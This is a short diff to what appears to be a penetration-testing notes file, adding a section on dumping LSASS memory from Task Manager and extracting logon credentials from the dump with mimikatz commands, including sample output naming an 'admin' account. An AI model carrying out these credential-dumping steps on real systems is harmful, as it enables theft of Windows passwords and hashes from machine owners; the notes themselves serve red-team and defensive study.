@@ -161,5 +161,22 @@ PID 536 -> 00/00 [0-0-0]
 mimikatz # sekurlsa::logonpasswords
 ```
 
+#### Memory dumping the LSASS
 
+We can create a lsass dump file from task manager. And retrive the hashs from dumped file
+
+![image](https://user-images.githubusercontent.com/24555370/145666196-39a66a44-e96d-4fa3-9ac8-f86ffbac06b3.png)
+
+dump the hash by first loading the dumped file, and run sekurlsa::logonpasswords
+```
+mimikatz # sekurlsa::minidump lsass.dmp
+Switch to MINIDUMP : 'lsass.dmp'
+
+
+mimikatz # sekurlsa::logonpasswords
+Opening : 'lsass.dmp' file for minidump...
+Authentication Id : 0 ; 32785103 (00000000:01f442cf)
+Session : RemoteInteractive from 1
+User Name : admin
+```
 
